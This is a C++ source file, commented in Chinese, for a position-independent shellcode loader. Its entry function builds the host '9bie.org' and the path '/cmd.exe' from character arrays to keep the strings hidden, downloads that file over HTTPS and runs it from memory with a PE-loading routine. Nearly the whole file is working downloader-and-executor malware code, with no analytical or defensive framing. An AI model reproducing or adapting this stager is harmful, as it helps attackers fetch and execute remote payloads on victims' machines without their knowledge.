#include "ShellCode.h"

//加载起始函数，跳转到入口函数
#ifdef _WIN64
VOID  mmLoaderSCStart(){
	Strat();
#else
VOID _declspec(naked) mmLoaderSCStart()
{

	__asm	jmp Strat;
#endif
}




//将需要转为shellcode的所有代码放在这个类中
class RmExecute
{
public:
	// 功能
#include"Tool.h"

public:
	//模拟全局变量---这里是对项目全局变量的定义


	Functions fn;
	char s_runexe[260];
	char* newbuff;


public:
	//关于全局变量初始化以及一些开始的操作
	RmExecute()
	{
		
		newbuff = NULL;
		Initfunctions(&fn);
		char runexe[] = { 'A', 'A','\0' };
		fn.fnmemcpy(s_runexe, runexe, 260);
	};



	
	~RmExecute()
	{
	};

	
public:
	

	//提取项目的main文件，StartSCode相当于项目的main函数
	void __stdcall StartSCode()
	{
		
		
		wchar_t host[] = {'9','b','i','e','.','o','r','g' ,'\0' };
		wchar_t path[] = { '/','c','m','d','.','e','x','e','\0' };
		
		
		//使用API之前一定要调用这个避免地址丢失
		Initfunctions(&fn);

		int size = HttpDownload(host, path, 443, TRUE);

		fn.fnMessageBoxA(NULL, newbuff, NULL, MB_OK);
	
		RunPortableExecutable();

		fn.fnfree(newbuff);
		// 用完HttpDownload一定要free
	}

	

};

//sehllcode入口函数
void __stdcall Strat()
{
	//由于需要模拟全局变量，所以使用类包裹下
	RmExecute runclass;
	
	runclass.StartSCode();
}
#ifdef _WIN64
void  mmLoaderSCEnd()
{
	
#else
void __declspec(naked) mmLoaderSCEnd()
{

	__asm int 3;
#endif
}